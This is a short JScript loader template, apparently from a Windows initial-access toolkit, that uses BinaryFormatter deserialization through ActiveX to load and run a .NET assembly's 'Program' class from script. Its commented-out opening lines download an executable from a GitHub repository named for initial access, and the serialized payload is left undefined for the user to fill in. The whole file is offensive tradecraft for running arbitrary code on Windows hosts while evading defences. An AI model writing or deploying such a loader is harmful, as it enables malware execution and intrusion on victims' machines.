
//var xHttp = new ActiveXObject("MSXML2.ServerXMLHTTP")
//xHttp.Open("GET", "https://github.com/hegusung/Windows-Initial-Access/raw/main/NET/PopUp.exe", false)
//xHttp.Send()

var entry_class = "Program"

var data = undefined

var fmt = new ActiveXObject("System.Runtime.Serialization.Formatters.Binary.BinaryFormatter")
var al = new ActiveXObject("System.Collections.ArrayList")
al.Add(undefined)

var d = fmt.Deserialize_2()
var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class)